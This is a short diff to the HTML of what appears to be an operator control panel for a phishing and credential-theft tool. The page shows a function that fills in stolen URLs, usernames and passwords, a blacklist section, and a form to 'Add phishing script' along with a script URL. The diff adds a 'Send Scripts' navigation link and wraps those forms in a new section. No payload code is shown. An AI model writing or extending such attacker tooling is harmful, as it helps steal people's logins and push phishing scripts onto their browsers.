@@ -295,6 +295,9 @@ function fillLogins(id, urlArray, usernameArray, passwordArray){
 			</li>
 			<li class = "nav-item">
 				<a class="nav-link" href="#blackListSection">Blacklist</a>
+            </li>
+            <li class = "nav-item">
+				<a class="nav-link" href="#scriptSection">Send Scripts</a>
 			</li>
 		</ul>
 	</nav>
@@ -349,6 +352,7 @@ function fillLogins(id, urlArray, usernameArray, passwordArray){
 
     <br><br>
 
+    <div id=scriptSection>
     <!-- Add Phishing -->
     <form name="phishingForm" onsubmit="phish()">
         <h4>Add phishing script:</h4>
@@ -370,6 +374,7 @@ function fillLogins(id, urlArray, usernameArray, passwordArray){
         <input type = "text" id = "JS_URL" placeholder = "URL"><br>
         <input type = "submit" id = "Submit_JS_Script" class="btn btn-primary">
     </form>
+    </div>
 
 	</div>
 	</div>
